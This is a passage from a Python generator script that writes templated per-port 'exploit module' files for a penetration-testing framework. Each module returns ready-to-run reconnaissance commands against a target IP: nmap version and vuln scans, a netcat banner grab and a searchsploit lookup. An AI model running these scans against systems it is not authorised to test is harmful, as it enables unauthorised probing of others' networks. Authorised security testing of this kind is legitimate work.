Custom exploit module — auto-generated by generate_port_modules.py
"""
import subprocess

MODULE_INFO = {{
    "port": {port},
    "service": "{service}",
    "name": "{service_upper} Exploit Module",
    "description": "{description}",
    "author": "Custom",
    "mitre": {mitre},
    "techniques": {techniques},
}}

EXPLOITS = {exploits}


def enumerate(target_ip, service_info=None):
    return list(EXPLOITS)


def exploit(target_ip, port={port}, exploit_info=None):
    if not exploit_info:
        exploit_info = EXPLOITS[0] if EXPLOITS else {{}}
    cmd = exploit_info.get("exec_command", "").replace("{{target}}", target_ip)
    return {{
        "command":  cmd,
        "module":   exploit_info.get("msf_module", ""),
        "status":   "ready",
        "target":   f"{{target_ip}}:{{port}}",
    }}
'''

GENERIC_EXPLOITS_TEMPLATE = [
    {
        "name": "TCP Service Version Probe",
        "source": "auto-generated",
        "type": "auxiliary",
        "msf_module": "auxiliary/scanner/portscan/tcp",
        "description": "Detect service version and banner on port {port}",
        "exec_command": "nmap -sV --script vulners,banner -p {port} {target}",
        "risk": "Info",
    },
    {
        "name": "Vulnerability Script Scan",
        "source": "metasploit",
        "type": "auxiliary",
        "msf_module": "auxiliary/scanner/portscan/tcp",
        "description": "Run nmap vuln scripts against port {port}",
        "exec_command": "nmap --script vuln -p {port} {target}",
        "risk": "Medium",
    },
    {
        "name": "Service Banner Grab",
        "source": "auto-generated",
        "type": "auxiliary",
        "msf_module": "",
        "description": "Grab service banner from port {port}",
        "exec_command": "echo '' | timeout 5 nc -v {target} {port} 2>&1 | head -20",
        "risk": "Info",
    },
    {
        "name": "SearchSploit Lookup",
        "source": "auto-generated",
        "type": "auxiliary",
        "msf_module": "",
        "description": "Search ExploitDB for service on port {port}",
        "exec_command": "searchsploit --json port:{port}",
        "risk": "Info",
    },
]


def build_exploits_from_db(port, ip="{target}"):
    """Build EXPLOITS list from PORT_DB entry."""
    _, _, _, raw = PORT_DB[port]
    exploits = []
    for name, source, etype, msf, desc, cmd, risk in raw:
        exploits.append({
            "name": name,
            "source": source,
            "type": etype,
            "msf_module": msf,
            "description": desc,
            "exec_command": cmd,
            "risk": risk,
        })
    return exploits


def build_generic_exploits(port):
    result = []
    for ex in GENERIC_EXPLOITS_TEMPLATE:
        e = dict(ex)
        e["description"]  = e["description"].format(port=port)
        e["exec_command"]  = e["exec_command"].format(port=port, target="{target}")
        result.append(e)
    return result


def generate_module(port: int) -> str:
    """Generate the full Python source for port_NNN_service.py."""
    if port in PORT_DB:
        service, desc, mitre, _ = PORT_DB[port]
        exploits = build_exploits_from_db(port)
    else:
        service, desc = get_range_service(port)
        mitre   = ["T1046"]
        exploits = build_generic_exploits(port)

    service_upper = service.upper().replace("-", " ")
    techniques    = [{"id": m, "name": f"MITRE {m}", "tactic": "Discovery"} for m in mitre]

    src = MODULE_TEMPLATE.format(
        port         = port,
        service      = service,
        service_upper= service_upper,
        description  = desc,
        mitre        = repr(mitre),
        techniques   = repr(techniques),
        exploits     = repr(exploits),
    )
    return src


def main():
    created = 0
    skipped = 0
    for port in range(1, 2001):
        if port in EXISTING:
            skipped += 1
            continue

        # Derive file name
        if port in PORT_DB:
            service = PORT_DB[port][0]
        else:
            service, _ = get_range_service(port)
        fname = f"port_{port}_{service.replace('-','_').replace(' ','_')}.py"
        fpath = os.path.join(MODULES_DIR, fname)

        if os.path.exists(fpath):
            skipped += 1
            continue

        src = generate_module(port)
        with open(fpath, "w") as f:
            f.write(src)
        created += 1
        if created % 100 == 0:
            print(f"  [{created}] Generated up to port {port}...")

    print(f"\n✅ Done — {created} modules created, {skipped} skipped (existing).")
    print(f"   Modules directory: {MODULES_DIR}")


if __name__ == "__main__":
    main()
